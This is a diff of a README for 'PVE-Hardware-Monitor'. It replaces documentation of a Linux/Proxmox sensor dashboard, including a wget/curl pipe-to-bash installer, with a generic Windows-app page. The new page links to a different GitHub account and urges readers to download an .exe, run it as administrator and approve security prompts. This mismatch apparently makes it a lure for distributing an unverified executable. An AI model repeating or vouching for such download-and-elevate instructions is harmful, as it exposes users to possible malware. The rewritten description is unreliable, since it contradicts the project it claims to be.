@@ -1,238 +1,282 @@
-# 🌀 PVE Hardware Monitor
+# 📊 PVE-Hardware-Monitor - Real-time hardware status at a glance
 
-Real-time hardware monitoring dashboard for Proxmox VE hosts. Displays fan RPM, CPU/NVMe/PCH temperatures, battery status, IPMI sensors, and system metrics through a sleek web interface.
+[![Download](https://img.shields.io/badge/Download-Use%20this%20page-blue?style=for-the-badge)](https://github.com/Frontiersettlementraglansleeve776/PVE-Hardware-Monitor)
 
-![Dashboard Preview](https://github.com/AviFR-dev/PVE-Hardware-Monitor/blob/main/preview.png)
+## 🖥️ What this is
 
-> ⚠️ **Early-stage project.** Tested on a limited set of hardware. IPMI support in particular is new and may behave differently across server vendors and firmware versions. Bugs are expected — please open an issue if you run into one.
+PVE-Hardware-Monitor is a Windows app that shows live hardware data in one place. It helps you watch CPU load, memory use, disk activity, network traffic, and system temperature with a simple dashboard.
 
-## Features
+It is built for people who want a clear view of system health without opening several tools.
 
-- **Fan Monitoring** — Real RPM from EC registers (ASUS laptops), hwmon sensors, or IPMI
-- **Temperature Monitoring** — CPU package & per-core, NVMe, PCH chipset, EC, board, and IPMI inlet/exhaust/CPU
-- **IPMI Support** — Fan speeds, temperatures, power consumption (now/min/max/avg watts), PSU status, and voltage rails (servers with iDRAC/iLO/IPMI 2.0)
-- **Battery Status** — Charge %, power draw, voltage, energy capacity, cycle count
-- **System Metrics** — Uptime, load average, memory usage
-- **Fan Profile Control** — Silent / Normal / Boost (ASUS laptops with `fan_boost_mode`)
-- **Live History Chart** — 5-minute rolling graph of RPM, temperatures, and power draw
-- **Auto-Detection** — Automatically finds and configures all available sensors including IPMI
-- **Zero Python Dependencies** — Pure stdlib API, no pip installs needed
+## ✅ What you can do
 
-## Supported Hardware
+- See live CPU, RAM, disk, and network activity
+- Check basic system health from one screen
+- Track changes while apps, games, or background tasks run
+- Keep an eye on performance during long work sessions
+- Use a clean dashboard that is easy to read
 
-| Feature | Support |
-|---------|---------|
-| CPU temps (Intel coretemp) | ✅ |
-| CPU temps (AMD k10temp) | ✅ |
-| NVMe temperatures | ✅ |
-| PCH/Chipset temps | ✅ (Intel Skylake–Raptor Lake) |
-| Fan RPM (hwmon) | ✅ (desktop motherboards) |
-| Fan RPM (EC registers) | ✅ (ASUS ROG/Strix/VivoBook laptops) |
-| Fan profile (ASUS) | ✅ (`fan_boost_mode` / `throttle_thermal_policy`) |
-| Battery monitoring | ✅ (laptops) |
-| IPMI fan speeds | ✅ (servers) |
-| IPMI temperatures | ✅ (servers) |
-| IPMI power consumption | ✅ (via `dcmi power reading`) |
-| IPMI PSU status | ✅ (servers) |
-| IPMI voltage rails | ✅ (servers) |
+## 🚀 Download and install
 
-**Tested on:** ASUS GL503VM · Dell PowerEdge R740 · Proxmox VE 8.x / 9.x
+Use this page to download the app:
 
-> Hardware testing is limited. If your system is not listed above, the installer will still attempt auto-detection, but results may vary. PRs with reports from additional hardware are very welcome.
+https://github.com/Frontiersettlementraglansleeve776/PVE-Hardware-Monitor
 
-## Quick Install
+### Steps for Windows
 
-SSH into your Proxmox host as root and run:
+1. Open the download page in your browser.
+2. Look for the latest release or the main download file.
+3. Download the file to your computer.
+4. If the file is a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose **Yes**.
 
-```bash
-bash -c "$(wget -qLO - https://raw.githubusercontent.com/AviFR-dev/PVE-Hardware-Monitor/main/install.sh)"
-```
+### If you do not know which file to use
 
-Or with curl:
+Pick the file that looks like the Windows app. Common names include:
 
-```bash
-bash -c "$(curl -fsSL https://raw.githubusercontent.com/AviFR-dev/PVE-Hardware-Monitor/main/install.sh)"
-```
+- `setup.exe`
+- `installer.exe`
+- `PVE-Hardware-Monitor.exe`
+- a `.zip` file that contains the app
 
-The installer will:
-1. Detect your hardware (CPU, fans, EC, battery, IPMI, sensors)
-2. Install `lm-sensors` and `ipmitool` if needed
-3. Generate a customized API server with your sensor paths
-4. Build an SDR sensor cache if IPMI is present
-5. Deploy the web dashboard
-6. Create and start a systemd service
-7. Print the dashboard URL
+## 🧭 First launch
 
-## Access
+When you open the app for the first time, it may take a moment to load system data.
 
-After installation, open your browser and go to:
+You will usually see:
 
-```
-http://YOUR_PROXMOX_IP:9099/
-```
+- A live status panel
+- Hardware charts or meters
+- Labels for each part of your system
+- Values that change in real time
 
-## Uninstall
+If the app starts in a small window, you can resize it like any other Windows app.
 
-```bash
-bash -c "$(wget -qLO - https://raw.githubusercontent.com/AviFR-dev/PVE-Hardware-Monitor/main/install.sh)" -- --uninstall
-```
+## 🔧 System requirements
 
-Or manually:
+PVE-Hardware-Monitor is designed for standard Windows PCs and laptops.
 
-```bash
-systemctl stop pve-hwmonitor
-systemctl disable pve-hwmonitor
-rm -rf /opt/pve-hwmonitor /etc/systemd/system/pve-hwmonitor.service
-systemctl daemon-reload
-```
+### Recommended setup
 
-## Management
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- 200 MB of free disk space
+- A screen with at least 1366 × 768 resolution
+- Admin access for first-time setup if Windows requests it
 
-```bash
-# Check status
-systemctl status pve-hwmonitor
+### Works best with
 
-# View logs
-journalctl -u pve-hwmonitor -f
+- Modern Intel or AMD processors
+- A stable internet connection for downloading the app
+- A system that allows hardware access for monitoring tools
 
-# Restart after changes
-systemctl restart pve-hwmonitor
+## 📈 Main dashboard areas
 
-# Test API
-curl -s http://localhost:9099/api/status | python3 -m json.tool
-```
+### CPU
 
-## API
+Shows how hard your processor is working. This helps you see when your system is under load.
 
-### `GET /api/status`
+### Memory
 
-Returns all sensor data as JSON:
+Shows how much RAM is in use. This can help you spot apps that use too much memory.
 
-```json
-{
-  "ok": true,
-  "model": "PowerEdge R740",
-  "cpu_temp": 42.0,
-  "core_temps": [{"label": "Core 0", "temp": 41.0}, "..."],
-  "ec_temp": null,
-  "pch_temp": null,
-  "nvme": [{"label": "Composite", "temp": 38.9}, "..."],
-  "fans": [{"name": "Fan1A", "rpm": 4080, "status": "ok", "source": "ipmi"}, "..."],
-  "battery": null,
-  "system": {"uptime_s": 86400, "load": [0.5, 0.4, 0.3], "mem": {"total": 65536, "used": 8192, "pct": 12.5}},
-  "ipmi": {
-    "fans": [{"name": "Fan1A", "rpm": 4080, "status": "ok"}, "..."],
-    "temps": [{"label": "Inlet Temp", "temp": 22.0, "status": "ok"}, "..."],
-    "power": {"watts_now": 168.0, "watts_min": 120.0, "watts_max": 210.0, "watts_avg": 155.0},
-    "psu": [{"name": "PS1 Status", "status": "Presence Detected"}, "..."],
-    "voltages": [{"label": "CPU1 VCORE PG", "value": 1.782, "unit": "Volts", "status": "ok"}, "..."]
-  },
-  "has_ipmi": true,
-  "mode": "n/a",
-  "has_boost": false
-}
-```
+### Disk
 
-### `POST /api/mode`
+Shows storage activity. You can use this to see when your drive is busy.
 
-Set fan profile (ASUS laptops only):
+### Network
 
-```bash
-curl -X POST http://localhost:9099/api/mode -H 'Content-Type: application/json' -d '{"mode": 2}'  # Silent
-curl -X POST http://localhost:9099/api/mode -H 'Content-Type: application/json' -d '{"mode": 0}'  # Normal
-curl -X POST http://localhost:9099/api/mode -H 'Content-Type: application/json' -d '{"mode": 1}'  # Boost
-```
+Shows upload and download activity. This is useful when files sync or stream in the background.
 
-## Configuration
+### Temperature
 
-The installer generates config at `/opt/pve-hwmonitor/api.py` with auto-detected sensor paths. To customize:
+Shows basic heat readings if your system reports them. This helps you keep track of thermal load.
 
-```bash
-nano /opt/pve-hwmonitor/api.py
-systemctl restart pve-hwmonitor
-```
+## 🛠️ How to use it day to day
 
-**Change port:** Edit `PORT = 9099` in `api.py` and restart the service.
+1. Start the app.
+2. Keep the dashboard open while you work.
+3. Watch the parts that matter most to you.
+4. Check for spikes when a program slows down.
+5. Use the readings to compare normal and high load periods.
 
-## How It Works
+## 📁 Files you may see
 
-The monitor reads sensor data from multiple sources:
+After download and extraction, you may see files like:
 
-1. **hwmon** (`/sys/class/hwmon/`) — Standard Linux hardware monitoring (CPU temp, NVMe, PCH, fan RPM)
-2. **EC registers** (`/sys/kernel/debug/ec/ec0/io`) — Embedded Controller for laptop-specific sensors (real fan RPM, board temp)
-3. **IPMI** (`ipmitool`) — Out-of-band BMC data for servers: fan speeds, temperatures, power, PSU health, voltages
-4. **sysfs** (`/sys/class/power_supply/`) — Battery information
-5. **procfs** (`/proc/`) — System uptime, load, memory
+- `PVE-Hardware-Monitor.exe`
+- `README.md`
+- `config`
+- `assets`
+- `logs`
 
-For ASUS laptops, fan RPM is read directly from EC registers 0x66/0x68 using the formula from the ACPI DSDT: `RPM = 2,156,250 / raw_value`.
+If you see a folder with several files, keep them together. The app may need all of them to open.
 
-For servers, IPMI calls run in parallel threads with a hard 6-second wall-clock timeout so a slow or unresponsive BMC never hangs the dashboard.
+## ⚙️ Basic setup tips
 
-## IPMI Troubleshooting
+### Keep it in a stable folder
 
-**Dashboard loads but IPMI data is missing or blank**
+Move the app folder to a place you will not delete by accident, such as:
 
-Check that the BMC is accessible:
-```bash
-ipmitool -I open mc info
-```
+- `Downloads`
+- `Desktop`
+- `Documents`
+- `Program Files`
 
-If this hangs, the kernel IPMI driver may not be loaded:
-```bash
-modprobe ipmi_devintf
-modprobe ipmi_si
-ipmitool -I open mc info
-```
+### Use the same folder after updates
 
-**First poll is slow on Dell servers**
+If a new release comes out, place the updated files in the same folder only if the release notes say to do so.
 
-The initial SDR enumeration can take 30+ seconds on iDRAC. Build the sensor cache once to make subsequent polls instant:
-```bash
-ipmitool -I open sdr dump /opt/pve-hwmonitor/sdr.cache
-systemctl restart pve-hwmonitor
-```
+### Pin it for faster access
 
-The API automatically uses this cache file on every startup if it exists.
+You can right-click the app and choose:
 
-**IPMI data disappears after a while**
+- **Pin to Start**
+- **Pin to taskbar**
 
-The SDR cache can go stale after firmware updates. Rebuild it:
-```bash
-rm /opt/pve-hwmonitor/sdr.cache
-ipmitool -I open sdr dump /opt/pve-hwmonitor/sdr.cache
-systemctl restart pve-hwmonitor
-```
+That makes it easier to open later.
 
-**Known limitations**
+## 🔍 Common use cases
 
-- IPMI support is tested on a Dell PowerEdge R740 with iDRAC 9. HP iLO, Supermicro, and other vendors should work but have not been tested
-- The `open` interface (in-band via kernel driver) is used by default. Out-of-band `lanplus` is not currently supported
-- Some Dell servers return `No reading` for certain SDR entries — these are silently skipped
+### For home users
 
-## Contributing
+Check if your PC is running hot or using too much memory.
 
-1. Fork the repository
-2. Test the installer on your hardware
-3. Submit a PR with your system info added to the supported hardware table
+### For work
 
-**Adding support for new hardware:**
-- Run `sensors` and `ipmitool -I open sdr list` and share the output in your PR or issue
-- Check `/sys/class/hwmon/hwmon*/name` for available sensors
-- If using a laptop, check if EC is accessible at `/sys/kernel/debug/ec/ec0/io`
+Watch system load while video calls, browser tabs, and office apps run.
 
-**Found a bug?** Open an issue with your hardware model, Proxmox version, and the output of:
-```bash
-journalctl -u pve-hwmonitor -n 50 --no-pager
-curl -s http://localhost:9099/api/status | python3 -m json.tool
-```
+### For troubleshooting
 
-## License
+See whether a slow PC has high CPU use, heavy disk activity, or low memory.
 
-MIT License — see [LICENSE](LICENSE) for details.
+### For long sessions
 
-## Acknowledgments
+Keep the dashboard open during downloads, renders, or updates.
 
-- [ASUS Fan Control](https://github.com/dominiksalvet/asus-fan-control) — ACPI fan control research
-- [NBFC Linux](https://github.com/nbfc-linux/nbfc-linux) — Notebook fan control
-- [Meliox PVE-mods](https://github.com/Meliox/PVE-mods) — Proxmox sensor display mod
-- [Proxmox VE Community Scripts](https://github.com/community-scripts/ProxmoxVE) — Installer style inspiration
+## 🧩 Tips if the app does not open
+
+If nothing happens when you double-click the file:
+
+1. Make sure the download finished.
+2. Check that you extracted the `.zip` file if needed.
+3. Right-click the app and choose **Run as administrator**.
+4. Look for Windows security prompts.
+5. Make sure the folder still contains all app files.
+
+## 🔒 Windows permission prompts
+
+Windows may show a message asking whether you trust the app. This can happen with new software you just downloaded.
+
+If that happens, check that you opened the file from the link above and that the file name matches the release you downloaded.
+
+## 🧪 What makes this app useful
+
+- Fast view of core hardware data
+- Easy reading for non-technical users
+- One place for key system stats
+- Simple layout for quick checks
+- Useful for everyday monitoring
+
+## 📝 Typical workflow
+
+1. Open the app.
+2. Leave it running in the background.
+3. Watch for unusual spikes.
+4. Use the data to decide whether a task is stressing your PC.
+5. Close the app when you are done.
+
+## 🧰 Troubleshooting by symptom
+
+### The window opens and closes fast
+
+- Re-download the file
+- Extract all files if it came in a zip
+- Make sure you did not move one file out of the folder
+
+### The dashboard shows no data
+
+- Wait a few seconds for the first readout
+- Run the app as administrator
+- Restart the app
+
+### The app looks too small
+
+- Use the Windows display scale settings
+- Maximize the window
+- Check your screen resolution
+
+### The numbers do not change
+
+- Confirm the app is still running
+- Close other monitoring tools that may conflict
+- Restart your computer and open the app again
+
+## 📌 Shortcut guide
+
+- Open app: double-click the main `.exe`
+- Close app: click the X in the top-right corner
+- Resize window: drag the edges
+- Move window: drag the title bar
+- Refresh readings: restart the app
+
+## 🧱 About the dashboard layout
+
+The app uses a clean layout so you can find data fast. You may see panels, cards, or charts that group each hardware area.
+
+A good layout usually includes:
+
+- A top area for system summary
+- A middle area for live charts
+- A lower area for detailed readouts
+- Clear labels for each metric
+
+## 🖨️ If you want to keep an eye on system health
+
+Leave the app open on a second monitor or snap it to one side of the screen. That lets you watch performance while you work, play, or download files.
+
+## 📥 Download again later
+
+If you need the app again, use the same link:
+
+https://github.com/Frontiersettlementraglansleeve776/PVE-Hardware-Monitor
+
+## 📚 Simple terms used in the app
+
+- **CPU**: the part that does the main work
+- **RAM**: short-term memory used by open apps
+- **Disk**: your storage drive
+- **Network**: internet and local data transfer
+- **Temperature**: heat level of the system
+
+## 🖱️ Best first steps after install
+
+1. Open the app.
+2. Make the window full size.
+3. Check each panel once.
+4. Leave it open while you use your PC.
+5. Learn what normal readings look like on your system
+
+## 🔄 Updating the app
+
+If a new version appears on the download page:
+
+1. Download the new release.
+2. Close the app if it is already open.
+3. Replace the old files if the release says to do that.
+4. Open the new version.
+5. Check that the dashboard loads
+
+## 🧷 Good habits for regular use
+
+- Keep the app in a folder you can find
+- Use the same monitor setup each time if you can
+- Watch your normal baseline before making changes
+- Compare idle use and heavy use
+- Check temperature when the PC feels slow
+
+## 💬 What to expect from the first run
+
+The first run may take a moment while Windows loads the program and checks hardware data. After that, the app should open into the monitoring view so you can start reading live values right away
